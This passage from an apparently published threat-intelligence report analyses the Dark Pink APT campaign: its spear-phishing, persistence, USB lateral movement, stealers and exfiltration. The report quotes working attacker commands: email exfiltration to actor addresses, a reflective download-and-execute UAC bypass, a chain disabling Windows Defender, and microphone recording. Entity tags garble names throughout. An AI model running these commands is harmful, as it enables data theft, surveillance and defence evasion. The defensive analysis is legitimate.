two military bodies in the [GPE] Philippines and [GPE] Malaysia , government agencies in [GPE] Cambodia , [GPE] Indonesia and [GPE] Bosnia [GPE] and [GPE] Herzegovina , and a religious organization in [GPE] Vietnam . [ORG] Group - IB also became aware of an unsuccessful attack on a [NORP] European state development agency based in [GPE] Vietnam . In line with [ORG] Group - IB \u2019s [CARDINAL] zero tolerance policy to cybercrime , confirmed and potential victims of [FAC] Dark [FAC] Pink were issued proactive notifications , and we note that the list of companies breached by this particular [ORG] APT group is likely to be longer . [ORG] Group - IB \u2019s early research into [PERSON] Dark [PERSON] Pink has revealed that these threat actors are leveraging a new set of tactics , techniques , and procedures rarely utilized by previously known [ORG] APT groups . They leverage a custom toolkit , featuring [ORG] TelePowerBot , [ORG] KamiKakaBot , and [ORG] Cucky [ORG] and [ORG] Ctealer information stealers ( all names dubbed by [ORG] Group - IB ) with the aim of stealing confidential documentation held on the networks of government and military organizations . Of particular note is [PERSON] Dark [PERSON] Pink \u2019s ability to infect even the [ORG] USB devices attached to compromised computers , and also its ability to gain access to messengers on infected machines . Furthermore , Dark Pink threat actors utilize [CARDINAL] two core techniques : [ORG] DLL Side - Loading and executing malicious content triggered by a file type association ( Event Triggered Execution : Change Default File Association ) . The latter of these tactics is [CARDINAL] one rarely seen utilized in the wild by threat actors . At the time of writing , [PERSON] Dark [PERSON] Pink is still active . Given the fact that many of the attacks identified by [ORG] Group - IB researchers took place in [DATE] the [DATE] final [DATE] months [DATE] of [DATE] 2022 , [ORG] Group - IB researchers are still in the process of identifying the full scope of the [ORG] APT attack , and efforts to uncover the origin of this [ORG] APT group are in process . However , we believe that this preliminary research , which will be of great interest to CISO , heads of cybersecurity teams , SOC analysts and incident response specialists , will go a long way to raising awareness of the new TTPs utilized by this threat actor and help organizations to take the relevant steps to protect themselves from a potentially devastating [ORG] APT attack . Key findingsDark Pink launched [CARDINAL] seven successful attacks against high - profile targets [DATE] between [DATE] June [DATE] and [DATE] December [DATE] 2022.2/26Dark [ORG] Pink \u2019s [ORDINAL] first activity , which we tie to a [GPE] Github account leveraged by the threat actors , was recorded in [DATE] mid-2021 , and the [ORDINAL] first attack attributable to this [ORG] APT group took place in [DATE] June [DATE] 2022 . Their activity peaked in [DATE] the [DATE] final [DATE] three [DATE] months [DATE] of [DATE] 2022 when they launched [CARDINAL] four confirmed attacks . [PERSON] Dark [PERSON] Pink \u2019s victims are located in [CARDINAL] five [ORG] APAC countries ( [GPE] Vietnam , [GPE] Malaysia , [GPE] Indonesia , [GPE] Cambodia , [GPE] Philippines ) and [CARDINAL] one [NORP] European country ( [GPE] Bosnia and Herzegovina).Victims included military bodies , government and development agencies , religious organizations , and a non - profit organization . [CARDINAL] One unsuccessful attack was launched against a [NORP] European state development agency based in [GPE] Vietnam in [DATE] October [DATE] 2022.Dark Pink APT \u2019s primary goals are to conduct corporate espionage , steal documents , capture the sound from the microphones of infected devices , and exfiltrate data from messengers . [PERSON] Dark [PERSON] Pink \u2019s core initial vector was targeted spear - phishing emails that saw the threat actors pose as job applicants . There was evidence to suggest that the threat actors behind [PERSON] Dark [PERSON] Pink scanned online job vacancy portals and crafted unique emails to victims that were advertising vacancies . Almost all the tools leveraged by the threat actors were custom and self - made , including [ORG] TelePowerBot and [ORG] KamiKakaBot , along with the Cucky and Ctealer stealers . During our investigation , we noticed [CARDINAL] only [CARDINAL] one public tool : [ORG] PowerSploit / Get - MicrophoneAudio . [PERSON] Dark [PERSON] Pink [PERSON] APT utilized a rarely seen technique , termed Event Triggered Execution : Change Default File Association , to ensure launch of malicious [ORG] TelePowerBot malware . Another technique leveraged by these particular threat actors was [ORG] DLL Side - Loading , which they used to avoid detection during initial access.3/26The threat actors created a set of [ORG] PowerShell scripts to carry out communication between victim and threat actors \u2019 infrastructure , facilitate lateral movement and network reconnaissance . All communication between infected infrastructure and the threat actors behind [PERSON] Dark [PERSON] Pink is based on [FAC] Telegram [FAC] API.Dark [FAC] Pink takes on all comersThe attacks carried out by this particular [ORG] APT group have been advanced in every sense of the word . They have utilized a sophisticated mixture of custom tools to breach the defenses of multiple government and military organizations . The [ORDINAL] first attack [ORG] Group - IB analysts were able to attribute to this [ORG] APT group was registered on a religious organization in [GPE] Vietnam in [DATE] June [DATE] 2022 . However , they appear to have been active well before that , as [ORG] Group - IB researchers identified a [GPE] Github account used by these threat actors which showed activity dating back to [DATE] mid-2021 . According to our research , the malware initialized by the threat actors can issue commands for an infected machine to download modules from this particular [GPE] Github account . Interestingly , the threat actors appeared to use [CARDINAL] only [CARDINAL] one [GPE] Github account for the entire duration of the campaign to date , which could suggest that they have been able to operate without detection for a significant period of time . Figure [CARDINAL] 1 : Screenshot detailing activity on [GPE] Github account attributed to [PERSON] Dark [PERSON] Pink [PERSON] APT in [DATE] 2021 ( above ) and [DATE] 2022 ( below)Following the [DATE] June [DATE] 2022 attack , [ORG] Group - IB researchers were unable to attribute any other malicious activity to [PERSON] Dark [PERSON] Pink . However , this [ORG] APT group burst into life towards [DATE] the [DATE] end [DATE] of [DATE] the [DATE] summer , when [ORG] Group - IB noticed an attack on a [NORP] Vietnamese non - profit organization in [DATE] August [DATE] 2022 bearing all the hallmarks of the [DATE] June attack . From then , [ORG] Group - IB was able to attribute [CARDINAL] one attack in [DATE] September , [CARDINAL] two attacks ( [CARDINAL] one successful , one4/26unsuccessful ) in [DATE] October , [CARDINAL] two in [DATE] November , and [CARDINAL] one in [DATE] December . Most recently , [ORG] Group - IB discovered that [PERSON] Dark [PERSON] Pink was able to breach an [NORP] Indonesian governmental organization on [DATE] December [DATE] 8 , 2022.Figure 2 : Dark Pink APT timeline and targetsKill ChainThe sophistication of the Dark Pink campaign is evidenced by its multiple distinct kill chains . The threat actors behind this wave of attacks were able to craft their tools in several programming languages , giving them flexibility as they attempted to breach defense infrastructure and gain persistence on victims \u2019 networks . As a result , we will discuss the different steps and stages of these processes , but it is important to note that the bulk of the attacks were based on [ORG] PowerShell scripts or commands that aimed to launch communication between the infected networks and the threat actors \u2019 infrastructure . Initial access was achieved by successful spear - phishing emails . These messages contained a shortened link directing the victim to download a malicious [ORG] ISO image , which in [CARDINAL] one case seen by [ORG] Group - IB , was stored on the public , free - to - use sharing service [GPE] MediaFire . Once the [ORG] ISO image was downloaded by the victims , Group- IB identified [CARDINAL] three distinct infection chains , which we will detail below . The [ORDINAL] first thing that caught our attention was that all communication between the devices of the threat actors and the victims was based on [FAC] Telegram [FAC] API . The custom modules created by the threat actors , [ORG] TelePowerBot and [ORG] KamiKakaBot , are designed to read and execute commands via a threat actor - controlled [ORG] Telegram bot . Interestingly , these modules were developed in different programming languages . TelePowerBot is represented as [ORG] PowerShell script , while [ORG] KamiKakaBot , which includes stealer functionalities , is developed on .NET . The5/26threat actors have used the same [ORG] Telegram bots for a long period of time , as one has been used since [DATE] September [DATE] 2021.Additionally , [PERSON] Dark [PERSON] Pink [PERSON] APT utilizes the self - made stealers [ORG] Ctealer and [ORG] Cucky to steal victim credentials from web browsers . We will look at each of the above mentioned tools later in this report . At this stage , we will turn to detailing each step of the infection chain . Initial accessA large part of the success of Dark Pink was down to the spear - phishing emails used to gain initial access . In [CARDINAL] one such attack , [ORG] Group - IB was able to find the original email sent by the threat actors . In this [CARDINAL] one instance , the threat actor posed as a job applicant applying for the position of PR and Communications intern . In the email , the threat actor mentions that they found the vacancy on a jobseeker site , which could suggest that the threat actors scan job boards and use this information to create highly relevant phishing emails . The emails contain a shortened URL linking to a free - to - use file sharing site , where the victim is presented with the option to download an [ORG] ISO image that contains all the files needed for the threat actors to infect the victim \u2019s network . During our investigation into [PERSON] Dark [PERSON] Pink , we discovered that the threat actors leveraged several different [ORG] ISO images , and we also noted that the documents contained in these [ORG] ISO images varied from case to case . According to the information available to us , we strongly believe that the Dark Pink threat actors craft a unique email to each victim , and we do not discount that the threat actors can send the malicious [ORG] ISO image as a direct attachment to the victim via email.6/26Figure [CARDINAL] 3 : Screenshot of original spear - phishing email sent by [PERSON] Dark [PERSON] Pink [PERSON] APT noting the storage of the [ORG] ISO image on a file - sharing site . The [ORG] ISO images sent in the spear - phishing emails contained varying numbers of files . However , there are [CARDINAL] three types of file found in all of the [ORG] ISO images sent by the threat actors : a signed executable file , a nonmalicious decoy document ( e.g. .doc , .pdf , or .jpg ) , and a malicious [ORG] DLL file . Given that the email relates to a job opening , one can assume that the victim will [ORDINAL] first look for the supposed applicant \u2019s resume , which is often sent as a MS Word document . However , In Dark Pink attacks , the threat actors include an .exe file in the [ORG] ISO image that mimics a MS Word file . The file contains \u201c .doc \u201d in the file name and contains the MS Word icon as a means of confusing the victim and thinking that the file is safe to open.7/26Figure [CARDINAL] 4 : Screenshot detailing the [CARDINAL] five files contained in [CARDINAL] one [ORG] ISO image seen by [ORG] Group - IB . Note that the .doc and .dll files are in hidden view . Should the victim execute the .exe file [ORDINAL] first , the malicious [ORG] DLL file , located in the same folder as the .exe file , will run automatically . This is a technique used by threat actors known as [ORG] DLL Side - Loading . The primary function of the [ORG] DLL execution is to ensure that the threat actors \u2019 core malware , TelePowerBot , gains persistence . Before the completion of the file execution , the decoy document ( e.g. a letter , resume ) , is shown on the victim \u2019s screen . Trojan execution and persistenceOne of the most interesting discoveries for [ORG] Group - IB researchers was the process of how [GPE] TelePowerBot or [ORG] KamiKakaBot are launched on the victim \u2019s machine . As mentioned previously , the malicious [ORG] DLL file that contains one of these [CARDINAL] two pieces of malware can be located inside the [ORG] ISO image that is sent during spear- phishing campaigns . In [CARDINAL] one case analyzed by [ORG] Group - IB , the threat actors used a chain of [ORG] MS [ORG] Office documents and leveraged [ORG] Template [ORG] Injection , whereby the threat actors insert into the initial document a link to a template document that contains a malicious macro code . In [CARDINAL] two other cases examined by [ORG] Group - IB researchers , the threat actors behind [PERSON] Dark [PERSON] Pink launched their malware by the DLL Side - Loading technique . In total , we found [CARDINAL] three different kill chains leveraged by the threat actors , and we will detail them below . Kill Chain 1 : All - inclusive ISOThe [ORDINAL] first variant of the infection chain results in an [ORG] ISO image being sent to the victim through spear - phishing emails . This [ORG] ISO image includes a malicious [ORG] DLL file , which contains TelePowerDropper ( name given by [ORG] Group - IB ) . The primary goal of this [ORG] DLL file is to gain persistence for [ORG] TelePowerBot in the registry of the infected machine . In some cases , the [ORG] DLL file can also launch the threat actors ' proprietary stealer [ORG] Stealer , which parses data from browsers on the victim \u2019s machine and stores it in a local folder . It is important to note that launching any kind of stealer is optional during initial access . Dark Pink can send special commands to download and launch a stealer during all phases of attack.8/26Figure [CARDINAL] 5 : [PERSON] Graphic detailing the full scheme of [ORG] Kill [ORG] Chain [ORG] 1It is important to note at this stage that the [ORG] DLL files are packed . When the file is launched , it decrypts itself and passes control to an unpacked version of itself . Additionally , once the [ORG] DLL file is launched , a mutex will be created . [CARDINAL] One example of this was : gwgXSznM - Jz92k33A - uRcCCksA-9XAU93r5 . Upon completion of this step , a command to start [ORG] TelePowerBot will be added to autorun . This means that [ORG] TelePowerBot will be launched each time the user logs into their system . This is facilitated by creating a registry key by path HKCU\\Environment\\UserInitMprLogonScript . The value of the created key is as follows : forfiles.exe /p % system32 % /m notepad.exe /c \" cmd.exe /c whoami > > % appdata%\\a.abcd & & [ORG] % appdata%\\a.abcd & & exit\"The above code reveals that the command launches a standard utility , whoami , which shows information about the current user of the machine . The output is redirected to a file and execution is finished . At this point it might not be entirely clear how the next stage , and the launching of TelePowerBot , begins . The key to this answer is the file extension .abcd . In short , the threat actors create a file with this extension name as part of a technique termedEvent Triggered Execution : Change Default File Association . The idea is to add a handler to work with the unrecognized file extension in the registry key tree . This is detailed in the below screenshot.9/26Figure [CARDINAL] 6 : Screenshot detailing command to run upon creation of file with extension .abcdThe above screenshot details part of a [ORG] PowerShell command that is triggered when a file is created with the specific extension .abcd . The [ORG] PowerShell commands are stored in base64 view and are highly obfuscated . The result of these commands are relatively simple : read registry key , decrypt , and launch TelePowerBot . Kill Chain 2 : Github macrosThe [ORDINAL] second variation of the infection chain is almost identical to the preceding one . The only thing that differs is the file used in the initial stage . During our analysis , we discovered that the threat actors used commands to automatically download a malicious template document containing [PERSON] TelePowerBot from [GPE] Github upon opening of the .doc contained in the initial [ORG] ISO file . Macro code written into this template document then works to ensure persistence for the malware . Figure [CARDINAL] 7 : Graphic detailing the full scheme of [ORG] Kill [ORG] Chain [ORG] 2In this instance , the [ORG] ISO image sent to the victims contains a MS Word document that leads to the automatic download of a malicious template document , which contains [PERSON] TelePowerBot , from [GPE] Github . In order to evade antivirus defenses on an infected machine during initial access , macro code is written into the template10/26document . This technique is known as Template Injection . The macro contains several forms with fields , and during execution , the value of these form fields are read and established as a value in registry keys . This trick can help the malware avoid detection by antivirus software , as the document itself does not contain any malicious functionalities or code . The coded documents contain forms with several parameters , and the macros contained in these files can read these values and work to ensure persistence of TelePowerBot on the victim \u2019s machine . Figure [CARDINAL] 8 : Screenshot detailing [CARDINAL] two forms contained predefined keys and values that are written to the registry by the malicious macro code written into the MS Word file sent to victimsKill Chain 3 : X(ML ) [MONEY] marks the spotThe [ORDINAL] third and final kill chain variant that we will detail is one that was used in the most recent [FAC] Dark [FAC] Pink attack analyzed by [ORG] Group - IB , which saw the threat actors breach the network of an [NORP] Indonesian government agency on [DATE] December [DATE] 8 , [DATE] 2022 . The [ORG] ISO image sent to the victim in a spear - phishing email contained decoy documents , a signed legitimate MS Word file , and a malicious [ORG] DLL named [ORG] KamiKakaDropper . The primary goal of this infection vector is to persist [ORG] KamiKakaBot on infected machines . In this kill chain , an XML file is located at the end of the decoy document in encrypted view . The malicious [ORG] DLL file is , as in [GPE] Kill [GPE] Chain [GPE] 1 , launched by [ORG] the DLL11/26Side - Loading technique . Once the [ORG] DLL file is launched , the XML file that kicks off the next stage of the kill chain will be decrypted from the decoy document and saved in the infected machine . Figure [CARDINAL] 9 : Graphic detailing the full scheme of [ORG] Kill [ORG] Chain 3The XML file contains an [ORG] MSBuild project that includes a task to execute .NET code . To find more about how this process works , please refer to the following [ORG] Microsoft documentation . The logic of the .NET code is simple : launch [ORG] KamiKakaBot , which itself is located in the XML file ( packed and encoded in base64 format ) . After this file is unpacked , control is passed to KamiKakaBotFigure [CARDINAL] 10 : Snippet of code inside XML file that unpacks and launches [PERSON] KakaKamiBot12/26The path to the XML file is passed as an argument upon the launch of [ORG] MSBuild . The command to run [ORG] MSBuild is located in the registry key ( HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell ) , which is created during execution of the [ORG] DLL file . Once this step is completed , [ORG] MSBuild will run each time a user logs on to the system . In addition , the [ORG] DLL creates a repeatable task to log the victim off from the system . Reconnaissance and lateral movementAfter infecting a computer in the victim organization \u2019s network , the next goal for [PERSON] Dark [PERSON] Pink is to collect as much information as possible about the victim \u2019s network infrastructure . From our analysis , we see that the threat actors are interested in the following : information from standard utility , [ORG] e.g output of standard utility systeminfo . information from web browsers . installed software , including antivirus solutions . information about connected [ORG] USB devices and network sharing . The threat actors also collect a list of network and [ORG] USB drives that are available for writing , and these are then used for lateral movement . Next , instead of the original file , the attack sees the creation of a [ORG] LNK file ( Windows shortcut ) with a command to launch TelePowerDropper . At this stage , the original files are hidden from the user . [CARDINAL] One of the most interesting revelations of our investigation into [PERSON] Dark [PERSON] Pink was how the threat actors carry out lateral movement over [ORG] USB devices . For this , a new WMI event handler is registered . From this point onwards , each time a [ORG] USB flash drive is plugged into an infected machine , a specific action will be executed that sees TeleBotDropper downloaded and stored on the flash drive . Let \u2019s analyze this process a little deeper.1Victim plugs [ORG] USB flash drive into infected device2The WMI event is triggered , and results in the automatic download of a .ZIP archive from the threat actors \u2019 [PERSON] Github account . There are [CARDINAL] three files inside this archive : [ORG] Dism.exe , [ORG] Dism.sys , and [ORG] Dismcore.dll . The [ORDINAL] first of these files is a legitimate file with a valid digital signature . The functionality of the [ORG] DLL file is to unpack the original executable from file Dism.sys.3Archive is extracted to % tmp% folder . The files are then copied to the [ORG] USB device , where a new folder named \u201c dism \u201d is created . The folder attribution is changed to hidden and system.4A file named system.bat is created , containing a command to launch Dism.exe513/26Finally , as many [ORG] LNK files are created as there are folders on the [ORG] USB drive . The attributes of the original folder are changed to hidden and system . A [ORG] LNK file is created with a command to open the hidden folder in explorer.exe and launch system.bat . Following this process , the user will see [ORG] LNK files bearing the same name as folders found on the [ORG] USB device . Once the user opens this malicious [ORG] LNK file , TeleBotDropper will be launched by the [ORG] DLL Side - Loading technique ( the functionalities of TeleBotDropper have been already shown in the previous section ) . As a result , the commands , which read registry key , decrypt , and launch TelePowerBot , are then transferred to a new machine . It is imperative to remember that this solution works if there is [CARDINAL] only [CARDINAL] one folder on the [ORG] USB device . This is why we observed different implementations , for example , the creation of [ORG] LNK files instead of .pdf files ( not only for folders ) on [ORG] USB devices . An example of how this works in more detail is provided in APPENDIX B. The mechanism of creating [ORG] LNK files in place of the original files is also used for network sharing . Data exfiltrationAs is the case with many other attacks of this kind , the threat actors exfiltrate data through ZIP archives . During Dark Pink attacks , all data ( list of files from common network shares , web browser data , documents , etc . ) that is to be sent to the threat actors is stacked in the $ env : tmp\\backuplog folder . However , the collection and sending process operate separately from one another . When the infected machine is issued a command to download the $ env : tmp\\backuplog folder , the list of files will be copied to $ env : tmp\\backuplog1 folder , added to archive and sent to the threat actors \u2019 [PERSON] Telegram bot . After this step is completed , the $ env : tmp\\backuplog1 directory is deleted . Dark Pink threat actors can also leverage their self - made stealers [ORG] Cucky [ORG] and [ORG] Ctealer to draw data from infected machines . The functionalities of both of these stealers are the same . They can be used to extract data such as passwords , history , logins , andcookies from web browsers . The stealers themselves do not require any internet connection , as they save the result of the execution ( stolen data ) to files . Both of the stealers can be downloaded from the threat actors \u2019 [PERSON] Github account automatically by commands issued by the malware . An example of the script used to launch [ORG] Cucky is shown in [ORG] APPENDIX [ORG] C.In total , [ORG] Group - IB researchers discovered that [PERSON] Dark [PERSON] Pink exfiltrated files via [CARDINAL] three separate pathways . The [ORDINAL] first of these pathways sees the threat actors use [ORG] Telegram to receive files . As a device is infected , information is collected in a specific folder by the malware and sent via [ORG] Telegram by a special command . By extension , the files that are sent to the threat actors are : .doc , .docx , xls,.xlsx,.ppt,.pptx,.pdf . An example of a script that carries out this process can be found in APPENDIX D.In addition to [ORG] Telegram , [ORG] Group - IB found evidence that the threat actors exfiltrated files via [ORG] Dropbox . This method is slightly different to the one used to exfiltrate via [ORG] Telegram , as it involves a series of [ORG] PowerShell scripts that transfer files from a specific folder to a [ORG] Dropbox account by performing a HTTP request with a hardcoded token . [CARDINAL] One particular attack discovered by [ORG] Group - IB was of particular surprise to us . Despite the device being controlled by commands issued by a threat actor - controlled [ORG] Telegram channel via [ORG] Telegram bots , some interesting files were sent via email . An example of this command is shown below.$filepath=\"$env : tmp / backuplog \" ; $ cred = New - Object [ORG] System . Management . Automation . PSCredential14/26(\"lanhuong.jsc@outlook.com\",(ConvertTo - SecureString \" CHANGED \" -AsPlainText - Force ) ) ; Send - MailMessage -To \" blackpink.301@outlook[.]com \" -From \" blackred.113@outlook[.]com \" -Body \" hello badboy \" -SmtpServer \" smtp-mail.outlook.com \" -Port [CARDINAL] 587 -Subject \" $ env : computername \" [MONEY] -UseSsl [MONEY] -Credential [MONEY] $ cred -Attachments ( gci $ filepath).fullnameThe list of emails used during data exfiltration are shown below : blackpink.301@outlook[.]com alibaba.113@outlook[.]com alibaba.113@outlook[.]com.vnblackred.113@outlook[.]com lanhuong.jsc@outlook[.]com [PERSON] nphuongmai.97@outlook[.]comAt this stage , [ORG] Group - IB researchers believe that the exfiltration method of choice depends on the potential restrictions set out in the victim \u2019s network infrastructure . Evasion techniquesDuring their attacks , the threat actors used an already known technique to bypass [ORG] User [ORG] Account [ORG] Control ( [ORG] UAC ) to alter the settings in [FAC] Windows [FAC] Defender . They did this by elevating the [ORG] COM interface . The methods used are not unique and different implementations were found in different programming languages . Figure [CARDINAL] 11 : Screenshot of decompiled executable that allows [ORG] UAC to be bypassedThe settings are changed by a special [ORG] PowerShell script which is received as a command , and implemented in .NET application . This command comes in the form of an executable file ( in base64 view ) that is automatically downloaded from [GPE] Github upon infection . The executable does not gain persistence nor is it saved on an infected system . The executable does not persist and is not saved into an infected system . An example of downloading and launching are shown below.15/26[Reflection . Assembly]::Load([System . Convert]::FromBase64String((New - Object [ORG] System . Net . WebClient).DownloadString(URL ) ) ) ; [ NETLUA.Main]::BypassUAC(\"powershell\\ \" , \\\"-c { $ [WORK_OF_ART] command}\")The [WORK_OF_ART] PowerShell command to modify [PRODUCT] Windows [PRODUCT] Defender [PRODUCT] Settings is passed as an argument and is shown as follows : Set - MpPreference -DisableArchiveScanning $ true -ea 0 ; Set - MpPreference -DisableBehaviorMonitoring $ true -Force -ea 0 ; Set - MpPreference -DisableCatchupFullScan $ true -Force -ea 0 ; Set - MpPreference -DisableCatchupQuickScan $ true -Force -ea 0 ; Set - MpPreference -DisableIntrusionPreventionSystem $ true -Force -ea 0 ; Set - MpPreference -DisableIOAVProtection $ true -Force -ea 0 ; Set - MpPreference -DisableRealtimeMonitoring $ true -Force -ea 0 ; Set - MpPreference -DisableRemovableDriveScanning $ true -Force -ea 0 ; Set - MpPreference -DisableRestorePoint $ true -Force -ea 0 ; Set - MpPreference -DisableScanningMappedNetworkDrivesForFullScan $ true -Force - ea [CARDINAL] 0 ; Set - MpPreference -DisableScanningNetworkFiles $ true -Force -ea 0 ; Set - MpPreference -DisableScriptScanning $ true -Force -ea 0 ; Set - MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 ; Set - MpPreference -EnableNetworkProtection [ORG] AuditMode -Force -ea 0 ; Set - MpPreference -MAPSReporting Disabled -Force -ea 0 ; Set - MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 ; Set - MpPreference -PUAProtection Disabled -Force -ea [CARDINAL] 0The [ORG] PowerShell commands will be executed using the .NET application as a tool for privilege escalation . TOOLSCuckyCucky is a simple custom stealer developed on .NET . A variety of samples were found during the investigation . The most analyzed versions were packed by [PERSON] Confuser . It does not communicate with the network , and collected information is saved in the folder % TEMP%\\backuplog . [ORG] Cucky is able to draw data such as passwords , history , logins , and cookies from targeted web browsers . Although we do not have any information related to the use of stolen data , we suppose that it can be used to gain access to email web clients , conduct additional infrastructure reconnaissance based on web history , compile a list of organization employees , distribute malicious attachments , and assess whether the compromised machine is real or virtual . [ORG] Cucky has the functionality to steal data from the following browsers : Chrome , MS [ORG] Edge , [ORG] CocCoc , [ORG] Chromium , Brave , [ORG] Atom , [ORG] Uran , Sputnik , [ORG] Slimjet , Epic Privacy , Amigo , [GPE] Vivaldy , Kometa , Comodo , Nichrome , Maxthon , Comodo Dragon , [PERSON] Avast [PERSON] Browser , Yandex Browser.16/26Figure [CARDINAL] 12 : Screenshot of decompiled Cucky stealerThe sample found contained the path below to debug information : C:\\Users\\hoang\\source\\repos\\Cucky\\Cucky\\obj\\Release\\net46\\Cucky.pdbCtealerCtealer is an analog of [ORG] Cucky but developed on C / C++ . TelePowerDropper or a special command issued by the threat actors can be used to deploy Ctealer . The working process is pretty similar to [ORG] Cucky as well , as it also saves collected files to the % TEMP%\\backuplog folder . Ctealer can draw information from the following web browsers : [ORG] Chrome , [ORG] Chromium , MS Edge , Brave , Epic Privacy , Amigo , [PERSON] Vivaldi , Orbitum , [ORG] Atom , [PERSON] Kometa , [ORG] Dragon , Torch , Comodo , [ORG] Slimjet , [CARDINAL] 360 [ORG] Browser , [ORG] Maxthon , K - Melon , Sputnik , Nichrome , [ORG] CocCoc , [GPE] Uran , [PERSON] Chromodo , [PERSON] Yandex [PERSON] Browser . The sample found contained the path below to debug information : C:\\Users\\build\\source\\repos\\CtealWebCredential\\Release\\CtealWebCredential.pdbTelePowerBotAs we have already noted , [ORG] TelePowerBot will be launched every time a user of an infected machine logs into the system . When this happens , a special script will be launched . The script reads the value of another regkey ( e.g HKCU\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd ) , which begins decryption and launch of [ORG] TelePowerBot . The encryption is based on xor where the key is an array number from [CARDINAL] 0 to [CARDINAL] 256 . Before decryption , the original payload will be decoded from base64 . The deobfuscated command example is shown below : iex ( [ System . Text . Encoding]::UTF8.GetString ( \" abcd\").\"abcd \" ) | % -Begin{$i=0 } -Process{([System . Convert]::FromBase64String((gp \" HKCU:\\\\SOFTWARE\\\\Classes\\\\abcdfile\\\\shell \" -Name$ _ = $ _ -bxor $ i%256;$i++;$_17/26 ) | iex))}The decrypted stage is not final . It is an intermediate stage and also is based on [ORG] PowerShell and is highly obfuscated . At this stage , the final script has already been stored in the stager but it is separated into blocks . From this , a base64 string is created , and after decoding , we will be left with a ZIP stream . Finally , after all this , [ORG] TelePowerBot is launched after unzipping . This kind of tool communicates with a [ORG] Telegram channel to receive new tasks from the threat actors . The bot can communicate with various infected devices , and the bot checks for new commands [TIME] every [TIME] 60 [TIME] seconds . During execution , the bot works with [CARDINAL] two register keys : HKCU\\Environment\\Update and HKCU\\Environment\\guid . The [ORDINAL] first [CARDINAL] one stores the last message i d , which is processed from the [ORG] Telegram bot ( The parameter update_id from [ORG] Telegram ) . The [ORDINAL] second key stores the unique identification of infected machines . It is generated by command [ guid]::NewGuid ( ) when the bot launches for the [ORDINAL] first time . Upon registration , the threat actors get various pieces of information about the infected machine such as ip , guid , computer name . The [ORG] IP address is also ascertained via a get request to url These processes are also based on [ORG] PowerShell commands , and we will dig a little deeper into those later in the report . The bot implementation is shown in APPENDIX A.Some variants of this module contain additional functionality for ensuring lateral movement . All other functionalities are the same . In cases that [ORG] Group - IB analyzed , the [ORG] Telegram parameter can either be hardcoded in the scripts or read from the registry key . KamiKakaBotKamiKakaBot is the .NET version of TelePowerBot , and we found very few differences between the pair of them . Before commands are read , [ORG] KamiKakaBot is able to exfiltrate from the [FAC] Chrome , MS Edge , and Firefox browsers . It is able to update itself and once it receives commands , it can pass an argument to the cmd.exe process . Figure [CARDINAL] 13 : Screenshot detailing decompiled executable that contains [PERSON] KamiKakaBotPowerSploit / Get - MicrophoneAudio18/26As we have noted above , the threat actors behind [PERSON] Dark [PERSON] Pink almost exclusively leveraged custom made tools . However , to record the microphone audio from infected devices , they turned to a publicly available [ORG] PowerSploit module - Get - MicrophoneAudio . This is loaded onto the victim \u2019s machine via download from [GPE] Github . Group - IB researchers found that antivirus software on victim machines blocked this process when the threat actors attempted to launch the module . We found that the threat actors attempted to obfuscate the original [ORG] PowerSploit module to make it undetectable , and these were unsuccessful . As a result , the threat actors returned to the drawing board and added a script ( below ) that was successfully able to record the microphone audio on infected devices.ps psr -erroraction ' silentlycontinue ' | kill -force;sleep 30 ; ni \" [MONEY] $ [MONEY] ( [MONEY] $ env : tmp)\\\\record \" -ItemType Directory -erroractionstart psr -ArgumentList \" /start /output $ ( $ env : tmp)\\\\record\\\\$((get - Start - Job { date).tostring('yyyyMMddHHmmss')).zip /sc [CARDINAL] 1 /gui 0 \" ; start psr -ArgumentList \" /stop\"This simple script launches a background task that triggers a standard utility [GPE] PSR to capture sound [TIME] every [TIME] minute . The recorded audio files will be saved inside a ZIP archive that is located in a temporary folder ( % TEMP%\\record ) . The files are named according to the following template : ' yyyyMMddHHmmss ' . These audio files are then exfiltrated with a separate script that sends them ( as a ZIP archive ) , to the threat actors \u2019 [PERSON] Telegram bot . ZMsg ( Messenger exfiltration)The threat actors are also interested in stealing data from messengers on infected devices . To this end , they are able to execute commands to identify leading messengers , such as [PERSON] Viber , [GPE] Telegram , and [PERSON] Zalo . In the case of [PERSON] Viber , these commands allow the threat actors to exfiltrate the % APPDATA%\\Viberpc folder on infected devices , which allows them to gain access to the messages and contact lists of the victims . We are still doing work to assess what the threat actors are able to draw from [ORG] Telegram accounts on infected devices , but the case of [PERSON] Zalo is one that piqued our interest . If [PERSON] Zalo [PERSON] messenger is present on the victim \u2019s device , the threat actors can launch a command to download a special utility ( dubbed ZMsg by [ORG] Group - IB ) , from [GPE] Github . This utility , which is a .NET application based on the FlaUI library , allows the threat actors to exfiltrate the victim \u2019s messages on the [PERSON] Zalo platform . FlaUI is a library that assists with the automatic [ORG] UI testing of Windows applications , with the entry point usually an application or the desktop to generate an automation element . Through this , it is possible to analyze sub - elements and interact with them . ZMsg iterates elements on Windows applications to discover those with particular names . For example , the element with messages has the name \u201c messageView \u201d . All collected information is stored in the % TEMP%\\KoVosRLvmU\\ folder in files with the .dat and .bin extensions . File names are created as an encoded hex string , and are generated in accordance with the below template:19/26%PERSON_NAME%_%DAY%_%MONTH%_%YEAR%CommandsThe threat actors issue commands to an infected device by specifying ip , computer name , or botid . Tasks can also be issued to all infected devices simultaneously . During our examination , we noticed several different kinds of commands . The functionalities of some of these commands overlap , but they are based on [ORG] PowerShell commands . For example , TelePowerBot can execute a simple standard console tool , such as whoami , or a complex [ORG] PowerShell script . During infection , the threat actors execute several standard commands ( e.g. net share , Get - SmbShare ) to determine what network resources are connected to the infected device . If network disk usage is found , they will begin exploring this disk to find files that may be of interest to them and potentially exfiltrate them . In the prior section , we noted how Dark Pink threat actors carry out lateral movement . In this campaign , the threat actors can also infect files on [ORG] USB disks attached to the infected devices . The script below details how the threat actors compile a list of network shares and the removable devices connected to the machine.(gwmi cim_logicaldisk|?{($_.drivetype -eq 2)-and(Test - path $ ( $ _ .deviceid)\\\\)}).deviceid ; ( get - smbshare|?{($_.name -notlike \" * $ \" ) -and($_.name -ne Users)-and($_.path - like * : \\\\*)}).path ; ( Get - SMBMapping|?{$_.Status -eq \" OK\"}).remotepath|?{$ _ -notlike ' * \\\\IPC}The threat actors can also issue a command to take a screenshot of the desktop of the compromised device and save these in the % TEMP% directory . They then download the images by issuing the below command . Add - type -AssemblyName System . Drawing Add - Type -AssemblyName System . Windows . Forms [ System . Windows . Forms . Screen]::AllScreens|% { $ bounds = 